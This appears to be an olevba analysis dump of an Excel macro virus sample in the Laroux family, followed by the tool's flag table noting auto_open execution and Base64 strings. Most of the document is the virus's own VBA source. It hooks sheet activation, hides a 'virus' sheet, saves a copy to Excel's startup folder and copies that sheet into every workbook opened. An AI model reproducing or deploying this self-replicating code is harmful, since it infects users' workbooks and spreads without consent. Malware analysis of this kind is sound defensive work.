olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-bf09a719265cffd40ccaaa8753bd1af42289fab1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO virus.bas 
in file: Virus.MSExcel.Laroux-based-bf09a719265cffd40ccaaa8753bd1af42289fab1 - OLE stream: '_VBA_PROJECT_CUR/VBA/virus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
























Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "Check_virus"
    Application.OnTime TimeValue("10:06:00"), "MassageVirus"
    Application.OnTime TimeValue("12:00:00"), "MassageVirus"
    Application.OnTime TimeValue("15:00:00"), "MassageVirus"
    Application.OnTime TimeValue("20:00:00"), "MassageVirus"
End Sub

Sub Check_virus()
Attribute Check_virus.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "Virus.XLS")
    If m$ = "Virus.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        Sheets("virus").Visible = True
        Sheets("virus").Select
        Sheets("virus").Copy
        With ActiveWorkbook
            .Title = ""
            .Subject = ""
            .Author = ""
            .Keywords = ""
            .Comments = ""
        End With
        newname$ = ActiveWorkbook.Name
        c4$ = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "Virus.XLS", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
            False, CreateBackup:=False
        ChDir c4$
        Workbooks(n4$).Sheets("virus").Visible = False
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "Virus.xls!Check_virus"
    Case 1
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        p4$ = ActiveWorkbook.Path
        s$ = Workbooks(n4$).Sheets(1).Name
        If s$ <> "virus" Then
            Workbooks("Virus.XLS").Sheets("virus").Copy before:=Workbooks(n4$).Sheets(1)
            Workbooks(n4$).Sheets("virus").Visible = True
        Else
        End If
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "Virus.xls!Check_virus"
    Case Else
End Select
End Sub

Sub TEST()
Attribute TEST.VB_ProcData.VB_Invoke_Func = " \n14"
        
        Workbooks("VIRUS.XLS").Sheets("virus").Visible = True
        Sheets("virus").Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  viru
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

